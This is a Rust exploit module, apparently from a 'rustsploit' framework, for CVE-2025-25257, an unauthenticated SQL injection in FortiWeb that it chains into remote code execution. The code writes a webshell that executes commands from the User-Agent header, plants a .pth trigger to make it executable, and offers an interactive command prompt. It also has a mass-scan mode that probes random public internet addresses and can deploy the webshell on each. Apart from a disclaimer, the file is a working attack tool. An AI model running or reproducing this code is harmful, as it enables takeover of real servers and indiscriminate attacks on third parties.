//! CVE-2025-25257 - FortiWeb SQLi to RCE Exploit
//! ==============================================
//!
//! DISCLAIMER:
//! This module is provided for AUTHORIZED security testing and educational purposes ONLY.
//! Unauthorized access to computer systems is illegal.
//!
//! Original PoC: TheStingR (https://github.com/TheStingR/CVE-2025-25257)
//! Ported to Rust for rustsploit framework
//!
//! CVE: CVE-2025-25257
//! Vuln Type: SQL Injection (Unauthenticated) -> Remote Code Execution
//! Affected: FortiWeb <= 7.0.10 / 7.2.10 / 7.4.7 / 7.6.3
//!
//! Attack chain:
//! 1. SQL injection via Authorization header in /api/fabric/device/status
//! 2. Create helper table to assemble payload
//! 3. Write webshell to filesystem via SELECT INTO OUTFILE
//! 4. Write .pth trigger to execute chmod on webshell
//! 5. Trigger .pth execution via Python CGI script
//! 6. Execute commands via User-Agent header in webshell

use anyhow::{anyhow, Context, Result};
use colored::*;
use rand::Rng;
use reqwest::Client;
use std::net::{IpAddr, Ipv4Addr};
use std::sync::Arc;
use std::sync::atomic::{AtomicUsize, Ordering};
use std::time::Duration;
use std::io::Write;
use tokio::sync::Semaphore;
use tokio::sync::mpsc;
use tokio::fs::OpenOptions;
use tokio::io::AsyncWriteExt;
use chrono::Local;
use crate::utils::normalize_target;

const DEFAULT_TIMEOUT_SECS: u64 = 15;
const MASS_SCAN_CONCURRENCY: usize = 100;
const MASS_SCAN_PORT: u16 = 443; // FortiWeb usually https

// Bogon/Private/Reserved exclusion ranges
const EXCLUDED_RANGES: &[&str] = &[
    "10.0.0.0/8", "127.0.0.0/8", "172.16.0.0/12", "192.168.0.0/16",
    "224.0.0.0/4", "240.0.0.0/4", "0.0.0.0/8",
    "100.64.0.0/10", "169.254.0.0/16", "255.255.255.255/32",
    "103.21.244.0/22", "103.22.200.0/22", "103.31.4.0/22", "104.16.0.0/13",
    "104.24.0.0/14", "108.162.192.0/18", "131.0.72.0/22", "141.101.64.0/18",
    "162.158.0.0/15", "172.64.0.0/13", "173.245.48.0/20", "188.114.96.0/20",
    "190.93.240.0/20", "197.234.240.0/22", "198.41.128.0/17",
    "1.1.1.1/32", "1.0.0.1/32", "8.8.8.8/32", "8.8.4.4/32",
];

const AGGRESSIVE_PAYLOADS: &[&str] = &[
    "SELECT/**/1;--",
    "SELECT/**/sleep(5);--",
    "SELECT/**/user();--",
    "SELECT/**/version();--",
    "UNION/**/SELECT/**/1;--",
    "OR/**/1=1;--",
    "ORDER/**/BY/**/1;--",
    "AND/**/1=1;--",
    "SELECT/**/count(*);--",
    "BENCHMARK(1000000,MD5(1));--"
];

#[derive(Clone, Copy, Debug)]
enum ScanMode {
    StandardSQLi,
    UnsafeRCE,
    AggressiveProbe,
    CustomInjection,
}

fn generate_random_public_ip(exclusions: &[ipnetwork::IpNetwork]) -> IpAddr {
    let mut rng = rand::rng();
    loop {
        let octets: [u8; 4] = rng.random();
        let ip = Ipv4Addr::from(octets);
        let ip_addr = IpAddr::V4(ip);
        if !exclusions.iter().any(|net| net.contains(ip_addr)) {
            return ip_addr;
        }
    }
}

/// Display module banner
fn display_banner() {
    println!(
        "{}",
        "╔═══════════════════════════════════════════════════════════╗".cyan()
    );
    println!(
        "{}",
        "║   FortiWeb SQLi to RCE - CVE-2025-25257                   ║".cyan()
    );
    println!(
        "{}",
        "║   Vuln: SQL Injection (Unauthenticated) -> RCE            ║".cyan()
    );
    println!(
        "{}",
        "║   Target: FortiWeb <= 7.0.10/7.2.10/7.4.7/7.6.3           ║".cyan()
    );
    println!(
        "{}",
        "║   Original PoC: TheStingR - Ported to Rust                ║".cyan()
    );
    println!(
        "{}",
        "╚═══════════════════════════════════════════════════════════╝".cyan()
    );
}

// Local normalize_target removed

/// FortiWeb SQLi to RCE Exploit Client
struct FortiWebExploit {
    client: Client,
    base_url: String,
    buggy_api: String,
    pyhook_path: String,
    webshell_path: String,
    pth_path: String,
    webshell_content: String,
    chmod_script: String,
}

impl FortiWebExploit {
    fn new(base_url: &str) -> Result<Self> {
        let client = Client::builder()
            .danger_accept_invalid_certs(true)
            .timeout(Duration::from_secs(DEFAULT_TIMEOUT_SECS))
            .build()
            .context("Failed to build HTTP client")?;

        // Simple sh webshell: executes commands from the User-Agent header
        let webshell_content = "#!/bin/sh -- \r\n\
            printf \"Content-Type: text/html\\r\\n\";printf \"\\r\\n\";eval $HTTP_USER_AGENT"
            .to_string();

        // Python script to chmod the webshell and clean up the .pth file
        let chmod_script = "import os # \r\n\
            os.system('chmod +x /migadmin/cgi-bin/x.cgi && rm -f /var/log/lib/python3.10/pylab.py') #"
            .to_string();

        Ok(Self {
            client,
            base_url: normalize_target(base_url)?,
            buggy_api: "/api/fabric/device/status".to_string(),
            pyhook_path: "/cgi-bin/ml-draw.py".to_string(),
            webshell_path: "/migadmin/cgi-bin/x.cgi".to_string(),
            pth_path: "/var/log/lib/python3.10/pylab.py".to_string(),
            webshell_content,
            chmod_script,
        })
    }

    /// Sends a GET request with crafted Authorization header to inject SQL
    /// Returns true if the response status is 401 (expected for successful injection)
    async fn inject_sql(&self, injection: &str) -> Result<bool> {
        let url = format!("{}{}", self.base_url, self.buggy_api);
        let auth_header = format!("Bearer ';{}", injection);

        let response = self
            .client
            .get(&url)
            .header("Authorization", auth_header)
            .send()
            .await
            .context("SQL injection request failed")?;

        Ok(response.status().as_u16() == 401)
    }

    /// Drops and recreates a helper table for payload assembly
    async fn prepare_table(&self) -> Result<()> {
        // println!("{}", "[*] Preparing helper table...".cyan()); // Silent in mass scan
        self.inject_sql("DROP/**/TABLE/**/fabric_user.a;--").await?;
        self.inject_sql("CREATE/**/TABLE/**/fabric_user.a/**/(a/**/TEXT);--")
            .await?;
        self.inject_sql("INSERT/**/INTO/**/fabric_user.a/**/VALUES('');--")
            .await?;

        Ok(())
    }

    /// Chunks the payload into 16-byte pieces, hex-encodes, and appends to table via SQLi
    async fn write_payload(&self, payload: &str) -> Result<()> {
        let parts: Vec<&str> = payload
            .as_bytes()
            .chunks(16)
            .map(|chunk| std::str::from_utf8(chunk).unwrap_or(""))
            .collect();

        for part in parts {
            let hexed = hex::encode(part.as_bytes());
            // println!("{}", format!("[*] Writing part: {}", part).dimmed());

            let injection = format!(
                "USE/**/fabric_user;UPDATE/**/a/**/SET/**/a=(SELECT/**/CONCAT(a,0x{})/**/FROM/**/a);--",
                hexed
            );
            self.inject_sql(&injection).await?;
        }

        Ok(())
    }

    /// Uses SELECT ... INTO OUTFILE to write the payload to the specified path
    async fn write_file(&self, path: &str, escape_quote: bool) -> Result<()> {
        let esc = if escape_quote { "''" } else { "'" };

        let injection = format!(
            "SELECT/**/a/**/FROM/**/fabric_user.a/**/INTO/**/OUTFILE/**/'{}'/**/FIELDS/**/ESCAPED/**/BY/**/{};--",
            path, esc
        );

        self.inject_sql(&injection).await?;
        Ok(())
    }

    /// Triggers the .pth file by accessing a Python CGI script
    async fn trigger_chmod(&self) -> Result<bool> {
        // println!("{}", "[*] Triggering .pth execution...".cyan());

        let url = format!("{}{}", self.base_url, self.pyhook_path);

        match self.client.get(&url).send().await {
            Ok(resp) => Ok(resp.status().as_u16() == 500),
            Err(_) => {
                // println!("{}", format!("[!] Trigger failed: {}", e).yellow());
                Ok(false)
            }
        }
    }

    /// Main attack: Write webshell and .pth trigger, then chmod via trigger
    async fn upload_webshell(&self) -> Result<bool> {
        // Step 1: Write webshell
        self.prepare_table().await?;
        self.write_payload(&self.webshell_content.clone()).await?;
        // println!("{}", "[>] Writing webshell...".green());
        self.write_file(&self.webshell_path.clone(), true).await?;

        // Step 2: Write chmod trigger (.pth file)
        self.prepare_table().await?;
        self.write_payload(&self.chmod_script.clone()).await?;
        // println!("{}", "[>] Deploying chmod trigger...".green());
        self.write_file(&self.pth_path.clone(), false).await?;

        // Step 3: Trigger execution
        let success = self.trigger_chmod().await?;
        Ok(success)
    }

    /// Execute a command via the deployed webshell
    async fn run_cmd(&self, cmd: &str) -> Result<String> {
        let url = format!("{}{}", self.base_url, self.webshell_path);

        let response = self
            .client
            .get(&url)
            .header("User-Agent", cmd)
            .send()
            .await
            .context("Command execution failed")?;

        let output = response.text().await.unwrap_or_default();
        Ok(output)
    }

    /// Get the webshell URL for the user
    fn get_webshell_url(&self) -> String {
        format!("{}/cgi-bin/x.cgi", self.base_url)
    }
}

/// Quick vulnerability check for mass scanning
async fn quick_check(ip: &str, mode: ScanMode, custom_payload: &str) -> bool {
    let host_port = format!("https://{}:{}", ip, MASS_SCAN_PORT);
    if let Ok(exploit) = FortiWebExploit::new(&host_port) {
        match mode {
            ScanMode::StandardSQLi => {
                match exploit.inject_sql("SELECT/**/1;--").await {
                    Ok(true) => true,
                    _ => false,
                }
            },
            ScanMode::UnsafeRCE => {
                // Try full webshell upload
                exploit.upload_webshell().await.unwrap_or(false)
            },
            ScanMode::AggressiveProbe => {
                for payload in AGGRESSIVE_PAYLOADS {
                    if let Ok(true) = exploit.inject_sql(payload).await {
                        return true;
                    }
                }
                false
            },
            ScanMode::CustomInjection => {
                match exploit.inject_sql(custom_payload).await {
                    Ok(true) => true,
                    _ => false,
                }
            }
        }
    } else {
        false
    }
}

/// Mass scan mode
async fn run_mass_scan() -> Result<()> {
    display_banner();
    println!("{}", "[*] Mass Scan Mode: 0.0.0.0/0".yellow().bold());
    println!("{}", "[*] Honeypot detection: DISABLED".yellow());
    println!("{}", format!("[*] Concurrency: {}", MASS_SCAN_CONCURRENCY).cyan());

    // Prompt for exclusions
    print!("{}", "[?] Exclude reserved/private ranges? [Y/n]: ".cyan());
    std::io::stdout().flush()?;
    let mut excl_choice = String::new();
    std::io::stdin().read_line(&mut excl_choice)?;
    let use_exclusions = !matches!(excl_choice.trim().to_lowercase().as_str(), "n" | "no");

    let mut exclusions = Vec::new();
    if use_exclusions {
        for cidr in EXCLUDED_RANGES {
            if let Ok(net) = cidr.parse::<ipnetwork::IpNetwork>() {
                exclusions.push(net);
            }
        }
    }
    let exclusions = Arc::new(exclusions);

    // Prompt for Output File
    print!("{}", "[?] Output File (default: fortiweb_hits.txt): ".cyan());
    std::io::stdout().flush()?; // Use std::io for flush/read
    let mut outfile = String::new();
    std::io::stdin().read_line(&mut outfile)?;
    let outfile = outfile.trim();
    let outfile = if outfile.is_empty() { "fortiweb_hits.txt" } else { outfile };
    let outfile = outfile.to_string();

    // Prompt for Payload Mode
    println!("{}", "[?] Select Payload Mode:".cyan());
    println!("    1. Standard SQLi Check (Safe)");
    println!("    2. Unsafe RCE Verification (Full Rewrite)");
    println!("    3. Aggressive Probe (Top 10 Payloads)");
    println!("    4. Custom Injection String");
    print!("{}", "Select option [1-4] (default 1): ".cyan());
    std::io::stdout().flush()?;
    let mut mode_str = String::new();
    std::io::stdin().read_line(&mut mode_str)?;
    let mode = match mode_str.trim() {
        "2" => ScanMode::UnsafeRCE,
        "3" => ScanMode::AggressiveProbe,
        "4" => ScanMode::CustomInjection,
        _ => ScanMode::StandardSQLi,
    };

    let mut custom_payload = String::new();
    if let ScanMode::CustomInjection = mode {
        print!("{}", "[?] Enter Custom SQLi Payload: ".cyan());
        std::io::stdout().flush()?;
        std::io::stdin().read_line(&mut custom_payload)?;
        custom_payload = custom_payload.trim().to_string();
    }
    let custom_payload = Arc::new(custom_payload);
    
    let semaphore = Arc::new(Semaphore::new(MASS_SCAN_CONCURRENCY));
    let checked = Arc::new(AtomicUsize::new(0));
    let found = Arc::new(AtomicUsize::new(0));

    // Result writer channel
    let (tx, mut rx) = mpsc::unbounded_channel::<String>();
    
    // Writer task
    let outfile_clone = outfile.clone();
    tokio::spawn(async move {
        let mut file = OpenOptions::new()
            .create(true)
            .append(true)
            .open(&outfile_clone)
            .await
            .expect("Failed to open output file");
            
        while let Some(result) = rx.recv().await {
             if let Err(e) = file.write_all(result.as_bytes()).await {
                 eprintln!("[-] Failed to write result: {}", e);
             }
        }
    });
    
    let c = checked.clone();
    let f = found.clone();
    tokio::spawn(async move {
        loop {
            tokio::time::sleep(Duration::from_secs(10)).await;
            println!("[*] Checked: {} | Found: {}", c.load(Ordering::Relaxed), f.load(Ordering::Relaxed));
        }
    });
    
    loop {
        let permit = semaphore.clone().acquire_owned().await.unwrap();
        let exc = exclusions.clone();
        let chk = checked.clone();
        let fnd = found.clone();
        let tx = tx.clone();
        let cp = custom_payload.clone();
        let current_mode = mode;
        
        tokio::spawn(async move {
            let ip = generate_random_public_ip(&exc);
            let ip_str = ip.to_string();
            
            if quick_check(&ip_str, current_mode, &cp).await {
                println!("{}", format!("[+] VULNERABLE: {}", ip_str).green().bold());
                fnd.fetch_add(1, Ordering::Relaxed);
                
                let timestamp = Local::now().format("%Y-%m-%d %H:%M:%S").to_string();
                let log_entry = format!("{} - {}\n", ip_str, timestamp);
                let _ = tx.send(log_entry);
            }
            
            chk.fetch_add(1, Ordering::Relaxed);
            drop(permit);
        });
    }
}



async fn prompt_input_std(msg: &str) -> Result<String> {
    print!("{}", msg);
    std::io::stdout().flush()?;
    let mut input = String::new();
    std::io::stdin().read_line(&mut input)?;
    Ok(input.trim().to_string())
}

pub async fn run(target: &str) -> Result<()> {
    if target == "0.0.0.0" || target == "0.0.0.0/0" || target.is_empty() || target == "random" {
        run_mass_scan().await
    } else {
        display_banner();
        println!("{}", format!("[*] Target: {}", target).yellow());
        println!();

        let exploit = FortiWebExploit::new(target)?;

        println!("{}", "[*] Select operation:".cyan());
        println!("  {} Deploy webshell (full exploit chain)", "1.".bold());
        println!("  {} Execute command (if webshell already deployed)", "2.".bold());
        println!("  {} Test SQL injection only", "3.".bold());
        println!();

        let choice = prompt_input_std("Select option [1-3]: ").await?;

        match choice.as_str() {
            "1" => {
                println!();
                println!(
                    "{}",
                    "[!] WARNING: This will write files to the target system!".yellow().bold()
                );
                let confirm = prompt_input_std("Continue? [y/N]: ").await?;
                if !confirm.eq_ignore_ascii_case("y") {
                    println!("{}", "[-] Operation cancelled.".red());
                    return Ok(());
                }

                println!();
                println!("{}", "[*] Starting exploit chain...".cyan());

                if exploit.upload_webshell().await? {
                    println!("{}", "[+] Webshell deployed successfully!".green().bold());

                    // Run initial 'id' command to verify
                    let output = exploit.run_cmd("id").await?;
                    println!("{}", "[+] Initial command output (id):".green());
                    println!("{}", output);

                    println!();
                    println!("{}", "[+] Webshell URL:".green().bold());
                    println!("    -> {}", exploit.get_webshell_url());
                    println!("    -> Send commands via User-Agent header");

                    // Interactive command loop
                    println!();
                    let interactive = prompt_input_std("Enter interactive mode? [y/N]: ").await?;
                    if interactive.eq_ignore_ascii_case("y") {
                        loop {
                            let cmd = prompt_input_std("cmd> ").await?;
                            if cmd.is_empty() || cmd == "exit" || cmd == "quit" {
                                break;
                            }
                            match exploit.run_cmd(&cmd).await {
                                Ok(out) => println!("{}", out),
                                Err(e) => println!("{}", format!("[!] Error: {}", e).red()),
                            }
                        }
                    }
                } else {
                    println!("{}", "[-] Exploit may have failed.".red());
                }
            }
            "2" => {
                // Direct command execution (assumes webshell already deployed)
                println!();
                let cmd = prompt_input_std("Enter command to execute: ").await?;
                if cmd.is_empty() {
                    return Err(anyhow!("Command cannot be empty"));
                }

                match exploit.run_cmd(&cmd).await {
                    Ok(output) => {
                        println!("{}", "[+] Command output:".green());
                        println!("{}", output);
                    }
                    Err(e) => {
                        println!(
                            "{}",
                            format!("[-] Command execution failed: {}", e).red()
                        );
                    }
                }
            }
            "3" => {
                // Test SQL injection only
                println!();
                println!("{}", "[*] Testing SQL injection...".cyan());

                let test_injection = "SELECT/**/1;--";
                match exploit.inject_sql(test_injection).await {
                    Ok(true) => {
                        println!(
                            "{}",
                            "[+] SQL injection successful! Target appears vulnerable.".green().bold()
                        );
                    }
                    Ok(false) => {
                        println!(
                            "{}",
                            "[-] SQL injection test failed. Target may not be vulnerable.".red()
                        );
                    }
                    Err(e) => {
                        println!("{}", format!("[-] Test failed: {}", e).red());
                    }
                }
            }
            _ => {
                println!("{}", "[-] Invalid option".red());
            }
        }

        println!();
        println!(
            "{}",
            "[!] REMINDER: This is for authorized testing only.".yellow()
        );
        Ok(())
    }
}
